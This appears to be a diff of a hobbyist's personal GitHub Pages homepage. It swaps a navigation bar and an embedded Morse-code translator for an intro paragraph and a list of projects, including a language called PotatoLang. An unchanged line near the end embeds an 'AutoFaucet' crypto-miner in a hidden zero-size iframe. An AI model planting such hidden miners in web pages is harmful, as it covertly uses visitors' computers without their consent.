@@ -16,7 +16,7 @@
         <head>
 
                 <!-- Declare the page title. -->
-                <title>Welcome!</title>
+                <title>Potato Party!</title>
 
                 <!-- Scale Site to Device-Width. -->
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -30,52 +30,65 @@
         <!-- Start of Body Tag. -->
         <body>
 
-                <!-- Site Header Title. -->
-                <h1 id="header">Home</h1>
+                <!-- Page Header. -->
+                <h1>Welcome</h1>
 
-                <!-- Site Navigation Bar. -->
-                <div id="navBtns">
-                        <button class="btnNav" id="homeBtn" onclick="alert('You are already home!')">Home</button>
-                        <button class="btnNav" id="projectBtn" onclick="window.location.replace('#')">Projects</button>
-                </div>
-                <!-- End of Site Navigation Bar. -->
-
-                <!-- Site Content. -->
-                <div id="home" class="navDiv">
-
-                        <!-- Main paragraph. -->
-                        <p style="margin-top: 3%;">
-                                Hello, welcome to my website! Here I will
-                                upload the games and other items I have
-                                created!
-                        </p>
-                        <!-- End of Main Paragraph. -->
-
-                        <!-- Showcase Items.-->
-                        <div id="showcase">
-
-                                <!-- Morse-God Content. -->
-                                <div class="showcaseItem">
-
-                                        <!-- Morse-God Header. -->
-                                        <h4 class="scItemH4">Morse-God</h4>
+                <!-- Start of Main Div. -->
+                <div id="main">
+                        <!-- Start of Content Div. -->
+                        <div id="content">
+                                <p>
+                                        Hey, I am AJ Cassell. I am a Full-Stack Developer or something... I just program whatever I feel like lol!
+                                        </br>
+                                        This site is to show projects I have worked on and other random stuff. I hope you enjoy your visit and come again or something :)
+                                        </br>
+                                        If you have any Ideas for the website or any bug found here you can open an issue on the <a href="https://github.com/BrotatoBoi/BrotatoBoi.github.io/issues">github repo</a>.
                                         
-                                        <!-- Morse-God Paragraph. -->
-                                        <p class="scItemP">
-                                                A Morse-Code translator created in python.
-                                        </p>
-                                        <!-- End of Morse-God Paragraph. -->
-                                        
-                                        <!-- Morse-God Embedded.-->
-                                        <iframe id="MGrepl" src="https://replit.com/@BrotatoBoi/Morse-God?embed=1&outputonly=1" frameborder="0"></iframe>
-                                </div>
-                                <!-- End of Morse-God Content. -->
-                                
+                                </p>
                         </div>
-                        <!-- End of Showcase Items. -->
+                        <!-- End of Content Div. -->
 
+                        <!-- Start of Projects Div. -->
+                        <div id="projects">
+                                <h2 style="margin-top: 1%;">Current Project</h2>
+
+                                <!-- Starting of Current Projects Div. -->
+                                <div id="current">
+                                        <h2><a href="./PotatoLang/index.html">PotatoLang</a></h2>
+                                        <p>
+                                                A programming language I am making.
+                                        </p>
+                                </div>
+                                <!-- End of Current Projects Div. -->
+
+                                <div id="line"></div>
+
+                                <h2 style="margin-top: 1%;">All Projects</h2>
+
+                                <!-- Starting of the All Projects Div. -->
+                                <div id="all">
+                                        <!-- Start of Proj Div. -->
+                                        <div id="proj">
+                                                <h2><a href="./#">Morse-God</a></h2>
+                                                <p>
+                                                        A Morse-Code translator.
+                                        
+                                                </p>
+                                        </div>
+                                        <!-- End of Proj Div. -->
+
+                                        <!-- Start of Proj Div. -->
+                                        <div id="proj">
+                                                <h2><a href="./#">PotatoLang</a></h2>
+                                                <p>
+                                                        A programming language I am making.
+                                        
+                                                </p>                
+                                        </div>
+                                        <!-- End of Proj Div. -->
+                                </div>
+                        </div>
                 </div>
-                <!-- End of Site Content. -->
                 
                 <!-- My AutoFaucet Miner Embedded. -->
                 <iframe src="https://autofaucet.org/wm/Bruhtato/2" width="0" height="0" style="border:0"></iframe>
